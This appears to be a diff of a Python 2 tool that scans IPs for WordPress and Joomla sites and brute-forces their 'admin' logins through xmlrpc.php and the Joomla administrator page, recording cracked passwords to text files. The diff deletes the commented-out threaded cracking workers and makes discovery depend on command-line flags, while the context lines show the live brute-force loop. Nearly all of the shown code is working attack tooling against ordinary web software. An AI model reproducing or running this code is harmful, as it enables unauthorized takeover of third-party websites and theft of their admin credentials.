@@ -125,47 +125,6 @@ def getWordpress(ip) :
       pass
     return set(list(lista))
 
-# Disabled for now
-"""
-# Joomla thread worker
-def workerJoomla(queue) :
-  queue_full = True
-  while queue_full:
-    try:
-      #get your data off the queue, and do some work
-      passwd = queue.get(False)
-      jm = Jmbrute(site)
-      token = jm.getToken()
-      if token :
-        jm.trylogin('admin', passwd, token)
-        if args.verbose : print '[*] Trying '+site+':admin:'+passwd
-        if jm.checklog() :
-          print Colors.GREEN+'[*] Cracked', site, 'user : admin', 'pass :', passwd+Colors.ENDC
-          logger(site, 'admin', passwd, 'joomla.txt')
-      else : break
-    except Queue.Empty:
-      queue_full = False
-
-# wordpress thread worker
-def workerWordpress(queue) :
-  queue_full = True
-  while queue_full:
-    try:
-      #get your data off the queue, and do some work
-      for passwd in passlist :
-        site1 = queue.get(False)
-        wp = WPxmlrpc(site1)
-        resp = wp.sendPost('admin', passwd)
-        #print resp
-        if args.verbose : print '[*] Trying '+site1+':admin:'+passwd
-        if resp :
-          if wp.checklog(resp) :
-            print Colors.GREEN+'[*] Cracked', site1, 'user : admin', 'pass :', passwd+Colors.ENDC
-            logger(site1, 'admin', passwd, 'wordpress.txt')
-        else : break
-    except Queue.Empty:
-      queue_full = False
-"""
 def file2list(fil) :
   with open(fil, 'r')  as myfile :
     return myfile.read().split()
@@ -261,39 +220,15 @@ else :
   elif args.fi :
     for ip in file2list(args.fi) :
       if args.verbose : print '[*] Grabbing Joomla from', ip
-      jmlist.extend(getJoomla(ip))
+      if args.joomla : jmlist.extend(getJoomla(ip))
       if args.verbose : print '[*] Grabbing wordpress from', ip
-      wplist.extend(getWordpress(ip))
+      if args.wordpress : wplist.extend(getWordpress(ip))
   passlist = file2list(args.wordl)
   wplist = addcontrol(wplist, 'xmlrpc.php')
   jmlist = addcontrol(jmlist, 'administrator/index.php')
   #print wplist
   #print jmlist
   #sitelist = [x+'administrator/index.php' for x in sitelist]
-  """if len(jmlist) != 0 :
-    print '[+] Brute forcing', len(jmlist), 'joomla sites'
-    # Bruting joomla
-    for site in jmlist :
-      #if args.verbose : print "[*] Bruting", site
-      q = Queue.Queue()
-      for passwd in passlist :
-        q.put(passwd)
-      for _ in range(threads_count) :
-        for passwd in passlist :
-          t = Process(target=workerJoomla, args = (q,))
-          t.start()
-      #t.join()
-  if len(wplist) !=0 :
-    q = Queue.Queue()
-    for site1 in wplist :
-      q.put(site1)
-    print '[+] Brute forcing', len(wplist), 'wordpress sites'
-    #if args.verbose : print "[*] Bruting", site
-    for _ in range(threads_count) :
-      t = Process(target=workerWordpress, args = (q,))
-      t.start()
-    #t.join()"""
-
   if jmlist :
     print '[+] Brute forcing', len(jmlist), 'joomla sites'
     for site in jmlist :
